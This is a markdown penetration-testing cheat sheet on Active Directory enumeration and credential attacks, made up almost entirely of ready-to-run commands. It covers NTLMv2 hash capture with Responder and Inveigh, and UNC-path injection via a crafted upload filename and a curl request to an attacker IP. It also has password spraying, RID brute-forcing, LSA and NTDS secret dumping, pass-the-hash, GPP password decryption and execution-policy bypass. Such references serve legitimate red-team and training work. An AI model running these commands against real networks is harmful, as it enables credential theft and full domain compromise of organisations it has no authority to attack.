# 🔭 AD Enumeration

## Capturing NTLMv2 Hashes

!!! info
    🐈‍⬛ Hashcat mode -> 5600

> <https://github.com/Kevin-Robertson/Inveigh>

```shell
# responder
sudo responder -I eth0

# SMB server
impacket-smbserver -smb2support <sharename> $(pwd)

# Windows privileged
inveigh.exe -httpd <ip>
```

### UNC Attack

```shell
# from inside the machine (shortcut file, shell or web attack)
dir \\<IP>\test
Content-Disposition: form-data; name="myFile"; filename="\\\\<ip>\\test"
curl http://<url>/index.php?view=//10.10.14.13/asdf
```

## Domain Enumeration

```shell
# rpcclient
querydominfo

enum4linux-ng -a <ip>
```

## Password Spraying

> <https://github.com/ropnop/kerbrute>

```shell
# nxc or cme
nxc smb <ip> -u users.txt -p <password> -d <domain> --continue-on-success

# kerbrute
kerbrute passwordspray -d <domain> users.txt <password> --dc <dc_ip>
```

## Password Policy

```shell
# rpcclient
getdompwinfo

# nxc
nxc smb <ip> -u <user> -p <pass> --pass-pol

# ldap
ldapsearch -x -H ldap://<ip> -D "<domain>\\" -W -b "DC=<domain>,DC=<tld>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# from Windows
net accounts
Get-DomainPolicy
```

## User Enumeration

> <https://github.com/lkarlslund/ldapnomnom>

> <https://github.com/ropnop/kerbrute>

```shell
#rpcclient
enumdomusers

# via Kerberos
kerbrute enumusers --dc <ip> -d <domain> <userlist>

# ldap
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=user)"
ldapnomnom -dnsdomain <domain> -server <dc-ip> -input <wordlist>

nxc smb <ip> -u <user> -p <pass> --users

enum4linux-ng -a <ip>

# Windows
.\Rubeus.exe brute /users:<userlist> /passwords:<wordlist> /domain:<domain>
```

## Validating Credentials

!!! tip
    🍪 NetExec

    - `[+]` is valid credentials
    - `[pwned!]` is valid credential with privileges

!!! tip
    🍪 Some users could have their username as their password

```shell
nxc smb <ip> -u <user> -p <password> -d <domain>
# local accounts
nxc smb <ip> -u <user> -p <password> --local-auth

# check in a range of machines
nxc smb x.x.x.70-76 -u <user> -p <password> -d <domain> --continue-on-success

# with a userlist and wordlist
nxc smb <ip> -u <userlist> -p <wordlist> -d <domain> --continue-on-success

# enumerate users by rid
nxc smb <ip> -u 'guest' -p '' --rid-brute

# kerbrute
kerbrute brute -d <domain> -u <user> -p <wordlist>
```

## NetExec

```shell
# users, groups and all
nxc smb <ip> -u <user> -p <pass> --users
nxc smb <ip> -u <user> -p <pass> --groups
nxc smb <ip> -u <user> -p <pass> --loggedon-users
nxc smb <ip> -u <user> -p <pass> --all

# find auto login credentials
nxc smb <ip> -u <user> -p <pass> -M gpp_autologin

# shares
nxc smb <ip> -u <user> -p <pass> --shares
nxc smb <ip> -u <user> -p <pass> -M spider_plus --share '<sharename>'

# dump lsa or ntds
nxc smb <ip> -u <user> -p <pass> --lsa
nxc smb <ip> -u <user> -p <pass> --ntds

# execute a command
nxc smb <ip> -u <user> -p <pass> -x <command>

# PTH
nxc smb <ip> -u <user> -H <hash> 
```

## GPP password in SYSVOL policy

```shell
# manual
grep -inr "cpassword" . --include=*.xml

# GPPPassword
# with NULL session
impacket-Get-GPPPassword -no-pass <ip>
# with creds
impacket-Get-GPPPassword <domain>/<user>:<pass>@<ip>
# parse a local file
impacket-Get-GPPPassword -xmlfile <Policy>.xml local

# nxc
nxc smb <ip> -u <user> -p <pass> -d <domain> -M gpp_password
```

Decrypt the password

```shell
gpp-decrypt <pass>
```

## Windows

### Living off the Land

```shell
# list domain users
net user /domain
net user /domain <username>
# list domain groups
net group /domain
net group /domain <groupname>

# add user to group
net group <groupname> <username> /add /domain

# list computers
net view

# check current shares
net share
# list a share
ls \\dc1.corp.com\sysvol\corp.com\
# all shares on the domain
net view /all /domain[:domainname]

# password policy
net accounts /domain

# check logged users
qwinsta

# get current domain name
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# check firewall
netsh advfirewall show allprofiles

# PowerShell
# list modules
Get-Module
Get-ExecutionPolicy -List
# change the policy for the current session
Set-ExecutionPolicy Bypass -Scope Process
# env values
Get-ChildItem Env: | ft Key,Value
# get user's history
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# check windows defender
sc query windefend
Get-MpComputerStatus
```

### Security Controls

```shell
# Windows Defender
Get-MpComputerStatus

# AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell language mode
$ExecutionContext.SessionState.LanguageMode

# LAPS
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Active Directory Module

```shell
Import-Module ActiveDirectory

# basic info
Get-ADDomain
# get users and groups
Get-ADUser
Get-ADGroup
Get-ADGroupMember -Identity "<group name>"
```

### PowerView

> [PowerView](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1)

> [SharpView](https://github.com/tevora-threat/SharpView)

```shell
# if scripts cannot be imported
powershell -ep bypass
Import-Module .\PowerView.ps1

# domain info
Get-NetDomain
# list users
Get-NetUser
Get-NetUser -Identity <username>
Get-NetUser | select cn
Get-NetUser <usercn>
# list groups
Get-NetGroup
Get-NetGroup | select cn
Get-NetGroup <groupcn> | select member
# recurseive group membership
Get-DomainGruoupMember -Identity "Domain Admins" -Recurse
# list computers
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# find local admin access for the current user
Find-LocalAdminAccess
# see who is logged on
Get-NetSession -ComputerName <computer>
# if it fails, use psloggedon.exe; needs Remote Registry active on host
PsLoggedon.exe \\<computer>

# list SPNs
Get-NetUser -SPN | select samaccountname,serviceprincipalname
# or
setspn -L iis_service
# list Access Control Entries (ACE) of user
Get-ObjectAcl -Identity <user>
# convert SID to name
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# filter by perm GenericAll for a specific group
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# find AS-REP Roastable accounts
Get-DomainUser -PreauthNotRequired -verbose
# find kerberoastable accounts
Get-NetUser -SPN | select serviceprincipalname

# find shares
Find-DomainShare

# test admin access
Test-AdminAccess -ComputerName <name>
```

### WMI

```shell
# patch level and description of the Hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn
# displays basic host information to include any attributes within the list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
# list all processes on host
wmic process list /format:list
# Domain and Domain Controllers
wmic ntdomain list /format:list
# all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list
# all local groups
wmic group list /format:list
# system accounts that are being used as service accounts
wmic sysaccount list /format:list
```

### Snaffler

Finds credentials in the AD environment.

> <https://github.com/SnaffCon/Snaffler>

```shell
Snaffler.exe -s -d <domain> -o snaffler.log -v data
```

## BloodHound

> [Installation](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
# first time start
./bloodhound-cli install
# reset password
./bloodhound-cli resetpwd
# restart containers
./bloodhound-cli containers restart
# stop containers
./bloodhound-cli containers stop

# legacy
sudo neo4j start
bloodhound
```

### SharpHound

!!! warning
    For BloodHound legacy (4.3.1) compatibility, use SharpHound [v1.1.1.1](https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1)

> <https://github.com/SpecterOps/SharpHound>

```shell
.\SharpHound.exe -c All

Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "dom audit"
```

### bloodhound-ce-python

> `pipx install bloodhound-ce`

```shell
bloodhound-ce-python -c All -u <user> -p <pass> -d <domain> -dc <dc_hostname> -ns <ns_ip> --zip 

# legacy
bloodhound-python -c All -u <user> -p <pass> -d <domain> -dc <dc_hostname> -ns <ns_ip> --zip 
```

## LDAPDomainDump

```shell
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <ip>
```

## Automated Enumeration

### ADpeas

> <https://github.com/61106960/adPEAS>

```shell
Import-Module .\adPEAS.ps1
Invoke-adPEAS
```
